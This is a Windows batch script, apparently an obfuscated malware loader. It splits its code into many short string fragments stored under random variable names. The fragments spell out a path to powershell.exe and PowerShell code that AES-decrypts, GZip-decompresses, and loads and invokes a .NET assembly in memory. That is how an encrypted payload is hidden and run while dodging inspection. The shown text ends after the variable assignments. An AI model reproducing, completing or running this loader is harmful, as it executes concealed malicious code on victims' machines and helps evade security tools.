@echo off
set "qNQvrBOwst=:\"
set "xvehosUjrr=em"
set "gBpJMcNdbI=in"
set "aMMgPYbgBG=he"
set "jBaYWjArTx=y "
set "PfjqEMNtlM=32"
set "ySlpaSmkAJ=Sy"
set "IwikOkRDxz= C"
set "dECzidvwlm=rS"
set "RsnreedLcw=1."
set "kWjzlRDuyB= /"
set "YdTjUuQFLd=do"
set "sTrhPxqyoX=po"
set "xXLmLICWMk=py"
set "yyBFUHbOAc=nd"
set "wazHhosUxF=rs"
set "xTGGArxUYH=he"
set "WiHJKMCruJ=0\"
set "VfDlEELZri=Wi"
set "EZImFJhqVj=ow"
set "nqeRPldLga=we"
set "djZpmwCgLW=co"
set "hGGZknPzDB=Po"
set "zaVpPWwrGV=st"
set "YJrDOtdGqp=we"
set "OEwejGeQTy=ll"
set "jdfTyAFTxu=ws"
set "TgDsoCSWFk=s\"
set "IQlunrtJZA=.e"
set "xWPlKTknCs=\W"
set "ErckezLCee=ll"
set "xZDhrCegQh=\v"
set "fvbJXADXcQ=xe"
set "cjQuXyMphX=cd"
set "LvZoQxsBkk= %~dp0"
set "vrsmoOrGUZ=jvlH"
set "ZkPzQuwQPH=)))"
set "zPGqFyzLwD=J = "
set "rPCdmrqNpM=$HeH"
set "NdKcmfGOvJ=);$L"
set "mASJmwlAAT=ress"
set "OzroSnzMaH=.Cre"
set "BILILkpVeK=n ''"
set "UdwPtfGZJx=)($w"
set "mwiXpfGZJA=[Sys"
set "aIFIrxmusx=mory"
set "LfxUAshgct=Comp"
set "gYgFjnFjRw=3); "
set "YlEyUlbRNZ=[Sys"
set "mKhSpdKiuT=v = "
set "dHnFEIBVur=se()"
set "UFifNdzAjl=embl"
set "TKJvgzhzjy=le  "
set "gieeMWcqhi=ke($"
set "vxrJrmyQWf=Disp"
set "KvwRmRIndR=.-16"
set "xlLRXVlGZS=tem."
set "AgjDMJSdwl=Kqmr"
set "AddihvpVyc=106u"
set "XSgzUqlpRT=CJ);"
set "HcAzXrQxOw=m(, "
set "NaPgFKftEs=c = "
set "qZULYeemYj=[IO."
set "pTBdaTqBWc=mdQ "
set "njscpiZtHD=New-"
set "RKhxTVBkoH=6] -"
set "BImQqLJUMH=.Len"
set "TPLUaUJDbr=FQ);"
set "wCjmPjJoLo=y]::"
set "fGTiIJzLVF=UKqm"
set "tmgvgoRFiR=lBlo"
set "kyavbdurqk=oint"
set "KrWvExsbTt=LbGX"
set "QNHTAKSRlF=daeR"
set "fdPiVoqIBr=bstr"
set "ouKmVcbiOs= [Sy"
set "hywCNPXRWH=-joi"
set "UruUdQKuHL= [Sy"
set "UPvFwanMwA=();$"
set "zlAGDrxWEK=ct S"
set "UpiaZgUXRw=);$y"
set "HroPWFwagK=esaB"
set "YwOhBMtHuP= '')"
set "EYbzkUbZGs=GXv."
set "wYOXPThGwK=GU ="
set "XGQlqDsARr=dj0C"
set "hxJILtCmPd=BC;$"
set "whoUDZSVxu=PKCS"
set "fRubxbyqiI=eMVs"
set "kOeIcKDKaw=th('"
set "wdPsjIszYv=[Sys"
set "mTdaNtYVLb=New-"
set "jekcpCgdvD=$OAl"
set "hUbLDXmZpg=ddin"
set "yrqpljCVrz=ode]"
set "PhDoTfRryn=.Com"
set "KuxYLLjDtb=l5E7"
set "ZZlmtovFjA=vert"
set "fjAlaLGCTd=raph"
set "HmMKptYRVA=[Env"
set "eoTqstjehp=Stre"
set "upcAwdbznO=.GZi"
set "zjkZMqoPzE= = $"
set "eZqZWSeCAE=m.IO"
set "LcKmjfbtRC=moic"
set "OXdpWyrzdx=join"
set "GKvmyPeqoG=();$"
set "kFNgTXZtih=yste"
set "rWuvEWrhWc=lit("
set "lwJLcARkwg=trea"
set "iabmMgtlhg=;$Lb"
set "mEAthYaNgF=F'[-"
set "ioXweYAbys=;$He"
set "xyYwulPHnc=wnBC"
set "NfckYVtetL=('Tg"
set "gBGVmsYcRd=-Obj"
set "drzVCbushV=and "
set "rvLNzwbjYw=-joi"
set "uooGtvsFHR= '')"
set "TOWxaRJqZz=File"
set "OZYRAxawyy=Secu"
set "ZjsfcYjanN=e]::"
set "uaCBpytsvo= = N"
set "dtpWxJgCqN=comp"
set "ikpkNdvcVw=ss -"
set "ZurXQycQeQ='gni"
set "IPYGXlkjbx=hy.A"
set "STsTrxRlBp=1..-"
set "dIPviEIowV=Bmor"
set "xwdFQhhXYL=CJ ="
set "azDwOCEFMh=oA.T"
set "WxzUzSCbFM=Kqmr"
set "FtuAFCbbFt=]::("
set "rWLCqPLUyz=gsYZ"
set "hLsMNnlZWs=ecry"
set "yIhOZForuP=morF"
set "XsuPjBdVFX=ach "
set "cgGOaZQNkS=raph"
set "UTUBTtGjEJ=[-1."
set "eNdnWjmgJZ=;$Cx"
